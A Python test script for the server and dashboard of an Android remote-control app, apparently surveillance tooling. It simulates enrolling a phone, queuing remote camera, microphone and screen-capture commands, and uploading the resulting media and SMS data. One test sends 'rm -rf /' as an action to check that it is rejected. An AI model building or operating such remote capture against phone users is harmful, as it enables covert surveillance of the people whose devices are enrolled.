#!/usr/bin/env python3
"""End-to-end check of the dashboard routes on a throwaway database.

Simulates exactly what the APK does (enroll -> poll commands -> upload media ->
report result) and then reads the data back through the browser routes, so the
real pc69.sqlite3 is never touched.
"""

import json
import shutil
import sys
import tempfile
from pathlib import Path

import server_gui as sg

FAILS = []


def check(name, ok, detail=""):
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  {detail}" if detail else ""))
    if not ok:
        FAILS.append(name)


tmpdir = Path(tempfile.mkdtemp(prefix="pc69test-"))
db = tmpdir / "test.sqlite3"
caps = tmpdir / "captures"
# save_media writes into CAPTURE_DIR, so point it at the sandbox for this run.
sg.CAPTURE_DIR = caps
caps.mkdir(parents=True, exist_ok=True)

store = sg.Store(db)
config = {
    "enrollment_key": "test-key-1234567890",
    "sync_interval_s": 3,
    "sms_interval_s": 60,
    "web_password": "",
}
app = sg.create_api(store, config)
c = app.test_client()

UID = "TESTDEV-abc123"
H = {"Authorization": "Bearer ", "Content-Type": "application/json"}

# ---------------------------------------------------------------- enroll
r = c.post("/api/v1/enroll", json={
    "device_uid": UID, "label": "Test Phone", "model": "PIXEL-TEST",
    "manufacturer": "Google", "android_release": "14", "sdk_int": 34,
    "app_version": "1.4", "enrollment_key": "test-key-1234567890",
})
check("POST /api/v1/enroll -> 200", r.status_code == 200, f"status={r.status_code}")
token = (r.get_json() or {}).get("device_token", "")
device_id = (r.get_json() or {}).get("device_id")
check("enroll returns a device token", bool(token))
check("enroll returns device_id", isinstance(device_id, int), f"id={device_id}")

auth = {"Authorization": f"Bearer {token}"}

# ---------------------------------------------------------------- telemetry
r = c.post("/api/v1/telemetry", headers=auth, json={
    "device_id": UID, "battery": 87,
    # The APK sends a list of {name, granted} objects (PermissionDto), not a map.
    "permissions": [{"name": "android.permission.CAMERA", "granted": True},
                    {"name": "android.permission.RECORD_AUDIO", "granted": True}],
    "installed_apps": [{"package": "com.example.test", "label": "Test App",
                        "version_name": "1.0"}],
})
check("POST /api/v1/telemetry -> 200", r.status_code == 200, f"status={r.status_code}")

# ---------------------------------------------------------------- devices
r = c.get("/api/v1/web/devices")
devices = (r.get_json() or {}).get("devices", [])
check("GET /api/v1/web/devices lists the device", len(devices) == 1, f"n={len(devices)}")
if devices:
    d = devices[0]
    check("device appears online after telemetry", d["online"] is True,
          f"last_seen={d['last_seen']}")
    check("device payload carries label", d["label"] == "Test Phone")
    check("device payload carries counts", "sms" in d["counts"])

r = c.get("/devices")
check("GET /devices (compat) -> list", r.status_code == 200 and isinstance(r.get_json(), list))

# ---------------------------------------------------------------- camera cmd
r = c.post(f"/api/v1/web/command/{device_id}",
           json={"action": "camera_photo", "params": {"camera": "back"}})
check("POST web command camera_photo -> 201", r.status_code == 201, f"status={r.status_code}")
check("command reports device online", (r.get_json() or {}).get("device_online") is True)
cmd_id = (r.get_json() or {}).get("id")

r = c.post(f"/api/v1/web/command/{device_id}", json={"action": "rm -rf /", "params": {}})
check("unknown action rejected (400)", r.status_code == 400, f"status={r.status_code}")

r = c.get(f"/api/v1/web/commands/{device_id}")
cmds = (r.get_json() or {}).get("commands", [])
check("dashboard sees the queued command",
      any(cm["action"] == "camera_photo" for cm in cmds), f"n={len(cmds)}")

# ---------------------------------------------------------------- device poll
r = c.get(f"/api/v1/commands?device_id={UID}", headers=auth)
payload = (r.get_json() or {}).get("commands", [])
check("device receives camera_photo on poll",
      any(p["action"] == "camera_photo" for p in payload), f"n={len(payload)}")

# ---------------------------------------------------------------- uploads
jpeg = b"\xff\xd8\xff\xe0" + b"0" * 2048 + b"\xff\xd9"
r = c.post(f"/api/v1/media/photo?device_id={UID}", headers=auth, data=jpeg,
           content_type="application/octet-stream")
check("POST /api/v1/media/photo -> 200", r.status_code == 200, f"status={r.status_code}")
photo_name = (r.get_json() or {}).get("file", "")

wav = b"RIFF" + (1234).to_bytes(4, "little") + b"WAVEfmt " + b"0" * 512
r = c.post(f"/api/v1/media/audio?device_id={UID}&format=wav", headers=auth, data=wav,
           content_type="application/octet-stream")
check("POST /api/v1/media/audio -> 200", r.status_code == 200, f"status={r.status_code}")

r = c.post(f"/api/v1/media/photo?device_id={UID}", headers=auth, data=b"")
check("empty media body rejected (400)", r.status_code == 400, f"status={r.status_code}")

r = c.post(f"/api/v1/media/photo?device_id={UID}", headers={"Authorization": "Bearer wrong"},
           data=jpeg)
check("media upload with bad token rejected (401)", r.status_code == 401,
      f"status={r.status_code}")

r = c.post("/api/v1/command_result",
           headers=auth, json={"device_id": UID, "id": cmd_id, "status": "ok",
                               "message": "photo uploaded"})
check("POST /api/v1/command_result -> 200", r.status_code == 200, f"status={r.status_code}")

# ---------------------------------------------------------------- read back
r = c.get(f"/api/v1/web/data/{device_id}/Media")
body = r.get_json() or {}
check("media list has 2 rows", len(body.get("rows", [])) == 2,
      f"rows={[row.get('kind') for row in body.get('rows', [])]}")
media_ids = [row["id"] for row in body.get("rows", [])]
check("media total matches", body.get("total") == 2, f"total={body.get('total')}")

if media_ids:
    r = c.get(f"/api/v1/web/media/{media_ids[0]}")
    check("media bytes served", r.status_code == 200 and len(r.data) > 0,
          f"status={r.status_code} bytes={len(r.data)}")
    check("media mime is browser-friendly",
          (r.headers.get("Content-Type") or "").startswith(("image/", "audio/")),
          r.headers.get("Content-Type", ""))

r = c.get(f"/api/v1/web/permissions/{device_id}")
perms = (r.get_json() or {}).get("permissions", [])
check("permissions reported", any(p["permission"].endswith("CAMERA") for p in perms),
      f"n={len(perms)}")

r = c.get(f"/api/v1/web/frame/{device_id}")
check("frame endpoint 404s before screen_start", r.status_code == 404,
      f"status={r.status_code}")
c.post(f"/api/v1/media/screen?device_id={UID}", headers=auth, data=jpeg)
r = c.get(f"/api/v1/web/frame/{device_id}")
check("frame served after screen upload",
      r.status_code == 200 and r.headers.get("Content-Type", "").startswith("image/"),
      f"status={r.status_code}")

# ---------------------------------------------------------------- dashboard
r = c.get("/")
check("GET / serves the dashboard", r.status_code == 200
      and b"Device console" in r.data, f"status={r.status_code} bytes={len(r.data)}")

r = c.get("/api/v1/web/catalog")
cat = (r.get_json() or {}).get("catalog", {})
check("catalog exposes camera/mic/screen actions",
      {"camera_photo", "mic_start", "screen_start", "camera_stream_start"} <= set(cat),
      f"n={len(cat)}")

r = c.get("/api/v1/web/data/999/SMS")
check("unknown device data returns empty, not 500",
      r.status_code == 200 and (r.get_json() or {}).get("rows") == [],
      f"status={r.status_code}")

r = c.get("/api/v1/web/data/1/Bogus")
check("unknown kind returns 404", r.status_code == 404, f"status={r.status_code}")

print()
print(f"FAILURES: {len(FAILS)}" + ("" if not FAILS else f" -> {FAILS}"))
shutil.rmtree(tmpdir, ignore_errors=True)
sys.exit(1 if FAILS else 0)
